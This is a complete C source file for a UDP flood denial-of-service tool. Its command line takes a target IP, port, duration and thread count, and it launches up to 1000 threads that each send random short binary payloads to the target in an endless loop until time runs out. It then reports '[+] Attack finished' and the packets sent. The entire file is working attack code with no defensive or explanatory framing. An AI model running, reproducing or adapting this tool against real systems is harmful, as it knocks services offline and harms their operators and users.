#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>

#define MAX_PACKET_SIZE 1472
#define THREAD_LIMIT 1000

volatile sig_atomic_t attack_running = 1;

void handle_interrupt(int sig) {
    attack_running = 0;
}

// Payload structure with binary-safe payloads
typedef struct {
    const char *data;
    size_t length;
} Payload;

Payload payloads[] = {
    { "\x3F\xA2\x91\x7C\xE5\xD0\x44\xB8\x9E\xF3\x12\x67\x88\xCD\x01\xFA", 16 },
    { "\x6B\x1D\xE9\xA4\x55\xFF\x33\xC8\x77\x22\x99\xBB\x00\x11\xDE\xAD", 16 },
    { "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", 12 },
    { "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12 },
    { "\x12\x34\x56\x78\x9A\xBC\xDE\xF0", 8 },
    { "\xDE\xAD\xBE\xEF", 4 },
    { "\xAB\xCD\xEF\x01\x23\x45\x67\x89", 8 },
    { "\x01\x00\x00\x00\x00\x00\x00\x00", 8 }
};

size_t payload_count = sizeof(payloads) / sizeof(payloads[0]);

// Thread argument structure
typedef struct {
    char ip[INET_ADDRSTRLEN];
    int port;
    unsigned long packet_count;
} ThreadArgs;

void *udp_flood(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    struct sockaddr_in server_addr;
    int sockfd, urandom_fd;
    unsigned int random_index;

    // Open /dev/urandom per thread
    urandom_fd = open("/dev/urandom", O_RDONLY);
    if (urandom_fd < 0) {
        perror("Failed to open /dev/urandom");
        pthread_exit(NULL);
    }

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        close(urandom_fd);
        pthread_exit(NULL);
    }

    // Set Don't Fragment flag
    int optval = IP_PMTUDISC_DO;
    if (setsockopt(sockfd, IPPROTO_IP, IP_MTU_DISCOVER, &optval, sizeof(optval)) == -1) {
        perror("setsockopt failed");
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    server_addr.sin_addr.s_addr = inet_addr(args->ip);

    args->packet_count = 0;

    while (attack_running) {
        if (read(urandom_fd, &random_index, sizeof(random_index)) <= 0) continue;

        Payload *p = &payloads[random_index % payload_count];

        sendto(sockfd, p->data, p->length, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        args->packet_count++;
    }

    close(sockfd);
    close(urandom_fd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <TIME(sec)> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads > THREAD_LIMIT) {
        printf("Too many threads requested. Limiting to %d.\n", THREAD_LIMIT);
        threads = THREAD_LIMIT;
    }

    signal(SIGINT, handle_interrupt);

    pthread_t *thread_ids = malloc(sizeof(pthread_t) * threads);
    ThreadArgs *args_array = malloc(sizeof(ThreadArgs) * threads);

    printf("[+] Starting UDP flood on %s:%d for %d seconds with %d threads...\n", ip, port, duration, threads);

    for (int i = 0; i < threads; i++) {
        strncpy(args_array[i].ip, ip, INET_ADDRSTRLEN);
        args_array[i].port = port;
        args_array[i].packet_count = 0;
        pthread_create(&thread_ids[i], NULL, udp_flood, &args_array[i]);
    }

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    unsigned long total_packets = 0;
    for (int i = 0; i < threads; i++) {
        total_packets += args_array[i].packet_count;
    }

    printf("[+] Attack finished.\n");
    printf("[+] Total packets sent: %lu\n", total_packets);

    free(thread_ids);
    free(args_array);

    return EXIT_SUCCESS;
}
